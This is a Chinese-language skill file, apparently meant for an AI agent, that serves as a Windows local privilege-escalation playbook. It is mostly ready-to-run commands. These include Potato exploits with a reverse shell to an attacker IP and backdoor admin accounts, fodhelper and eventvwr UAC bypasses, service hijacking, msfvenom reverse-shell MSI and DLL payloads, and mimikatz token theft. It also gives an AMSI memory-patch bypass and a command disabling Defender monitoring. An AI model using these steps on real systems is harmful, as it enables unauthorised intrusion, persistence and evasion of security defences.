---
name: 反客为主·窗府
description: >-
 Windows 本地权限提升：Token 窃取、UAC 绕过、AlwaysInstallElevated、
 服务配置错误、Potato 系列（JuicyPotato/PrintSpoofer/GodPotato）、DLL 劫持。
 
version: 1.0.0
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# Windows 本地权限提升（LPE）

## 触发条件

：
- Windows 提权、LPE、UAC 绕过
- SeImpersonatePrivilege、Token 窃取
- JuicyPotato、PrintSpoofer、GodPotato、RoguePotato
- AlwaysInstallElevated、服务配置错误
- DLL 劫持、Unquoted Service Path
- WinPEAS、PowerUp、PrivescCheck

---

按 **OS 版本 + 补丁** 选 Potato / CVE，补丁已打的路径记阴性换刀。Linux/容器走 `linux-privilege-escalation`。

## 1. 快速侦察（第一步）

```powershell
# ── 当前权限 ──
whoami /all # 所有权限与组
whoami /priv # 仅特权列表

# ── 系统信息 ──
systeminfo # OS 版本 + 补丁
wmic qfe list brief # 已安装补丁

# ── 自动化侦察 ──
# WinPEAS（推荐）
.\winPEAS.exe

# PowerUp（PowerSploit）
. .\PowerUp.ps1; Invoke-AllChecks

# PrivescCheck
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
```

---

## 2. Potato 系列（SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege）

> 适用条件：`whoami /priv` 显示 `SeImpersonatePrivilege` 或 `SeAssignPrimaryTokenPrivilege`（常见于 IIS/MSSQL/WebShell）

### 2.1 PrintSpoofer（Win10/Server 2019+）

```powershell
# 下载
# https://github.com/itm4n/PrintSpoofer

# 执行命令
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "powershell -ep bypass"

# 反弹 shell
.\PrintSpoofer.exe -c "cmd /c \\攻击机IP\share\nc.exe -e cmd 攻击机IP 4444"
```

### 2.2 GodPotato（最新，Win8-Server 2022）

```powershell
# https://github.com/BeichenDream/GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add"
.\GodPotato.exe -cmd "powershell -ep bypass -enc <base64_payload>"
```

### 2.3 JuicyPotato（Win7/Server 2016 及以下）

```powershell
# 需要 CLSID（根据 OS 版本选择）
# https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe ^
 -a "/c net user hacker Pass123! /add" ^
 -t * ^
 -c {CLSID}

# 示例 CLSID（Windows 10）
# {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

### 2.4 RoguePotato（需要攻击机转发）

```bash
# 攻击机：监听 135 端口并转发
socat tcp-listen:135,reuseaddr,fork tcp:目标机IP:9999

# 目标机：
.\RoguePotato.exe -r 攻击机IP -e "cmd /c whoami > C:\Temp\whoami.txt" -l 9999
```

---

## 3. UAC 绕过

### 3.1 fodhelper.exe（Win10，无需文件落地）

```powershell
# 修改注册表，绕过 UAC
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
 -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
 -Name "(Default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# 清理
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### 3.2 eventvwr.exe

```powershell
$regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c whoami > C:\Temp\out.txt"
Start-Process "eventvwr.exe"
Start-Sleep -s 3
Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

### 3.3 UACME（自动化 UAC 绕过工具）

```powershell
# https://github.com/hfiref0x/UACME
# 包含 60+ 种 UAC 绕过方法
akagi64.exe 61 C:\Temp\payload.exe
```

---

## 4. 服务配置错误

### 4.1 弱权限服务

```powershell
# 找可写的服务二进制
Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | Select-Object Name, PathName
# PowerUp 自动检测
Invoke-ServiceAbuse -Name 'VulnerableService'

# 手工：替换服务 EXE
copy /y C:\Temp\nc.exe "C:\Program Files\Vulnerable\service.exe"
sc stop VulnerableService
sc start VulnerableService

# 或修改服务执行路径
sc config VulnerableService binpath= "cmd /c net user hacker Pass123! /add"
sc stop VulnerableService && sc start VulnerableService
```

### 4.2 未引用的服务路径（Unquoted Service Path）

```powershell
# 检测（存在空格且无引号）
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'

# 利用：把 payload 放在路径前缀
# 服务路径: C:\Program Files\My App\service.exe
# → 放: C:\Program.exe 或 C:\Program Files\My.exe
copy C:\Temp\payload.exe "C:\Program.exe"
sc stop "MyService" && sc start "MyService"
```

### 4.3 AlwaysInstallElevated

```powershell
# 检测
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两者都为 1 → 存在漏洞

# 生成恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4444 -f msi > evil.msi
# 传到目标
msiexec /quiet /qn /i evil.msi
```

---

## 5. Token 窃取

```powershell
# 列出进程和 token
.\mimikatz.exe "privilege::debug" "token::elevate" "token::list" "exit"

# 窃取 SYSTEM token
.\mimikatz.exe "privilege::debug" "token::elevate" "exit"
# 现在以 SYSTEM 运行

# Incognito（Metasploit 模块）
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

## 6. DLL 劫持

```powershell
# 工具：Process Monitor（ProcMon）→ 过滤 NAME NOT FOUND + .dll
# 找到 → 在可写目录放恶意 DLL（同名）

# 生成恶意 DLL（MSF）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > evil.dll

# 或 C 语言最小 DLL
# BOOL WINAPI DllMain(...) { system("cmd /c net user hacker Pass123! /add"); return TRUE; }
```

---

## 7. 常见 Windows 内核 CVE

| CVE | 系统版本 | 说明 |
|-----|---------|------|
| CVE-2021-1675 | Win10/Server 2019 | PrintNightmare（Spooler 提权） |
| CVE-2020-0787 | Win7-Win10 1903 | BITS 服务提权 |
| CVE-2019-1388 | Win7/Server 2008 | UAC 对话框提权 |
| CVE-2016-0099 | Win7-Server 2012 R2 | 二次登录服务提权 |

```bash
# windows_lpe_checker.py（本库）
python3 炼蛊房/windows_lpe_checker.py --target <IP> --user admin --pass Pass
```

---

## 8. Bypass AMSI（执行 PowerShell 攻击脚本前必做）

AMSI（Antimalware Scan Interface）会拦截 PowerShell 脚本内容，以下三种方式可绕过：

### 方法一：一键关闭（最简单，但特征明显易被检测）

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 若上方被拦截，进行混淆（拆分字符串绕过签名）
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### 方法二：PowerShell 降级（无 AMSI 支持）

```powershell
# 以 v2 启动 PowerShell（v2 不支持 AMSI）
powershell.exe -version 2

# 确认版本
$PSVersionTable.PSVersion
```

### 方法三：内存补丁（最稳定，patch AmsiOpenSession 函数）

```powershell
$p = @"
using System;
using System.Linq;
using System.Runtime.InteropServices;
public class AMSIBypass {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        // 反向拼接 "amsi.dll" 规避字符串检测
        string lib = new string(new char[]{'a','m','s','i','.','d','l','l'});
        IntPtr hModule = LoadLibrary(lib);
        IntPtr addr = GetProcAddress(hModule, "AmsiOpenSession");
        uint old = 0;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        // ret 指令（直接返回，跳过扫描）
        byte[] patch = { 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3 };
        System.Runtime.InteropServices.Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
"@
Add-Type $p
[AMSIBypass]::Patch()
```

### 验证是否绕过

```powershell
# 测试（正常情况下 AMSI 会拦截这个字符串）
'amsicontext'
# 若无报错 = bypass 成功
```

### 快速备忘（绕过选择）

| 场景 | 方法 |
|---|---|
| 交互式 PS 会话，快速绕过 | 方法一（一键） |
| 目标系统存在 PS v2 | 方法二（降级） |
| 需要稳定绕过、自动化脚本 | 方法三（内存补丁） |
| 管理员权限 | `Set-MpPreference -DisableRealtimeMonitoring $true` |

---

## 快速决策树

```
whoami /priv
 ├─ SeImpersonatePrivilege → GodPotato（首选）/ PrintSpoofer
 ├─ SeDebugPrivilege → mimikatz token::elevate
 ├─ SeBackupPrivilege → 读取任意文件（NTDS.dit）
 └─ 无特权 →
 ├─ UAC 开启 → fodhelper / UACME
 ├─ AlwaysInstallElevated → 恶意 MSI
 ├─ 服务弱权限 → PowerUp Invoke-AllChecks
 └─ 内核 CVE → systeminfo + watson.exe
```

配套：`windows-ad-pentest` · `smb-lateral-movement` · `linux-post-exploit`

## 真源

- 手法：`传承/反客为主-窗府.md`
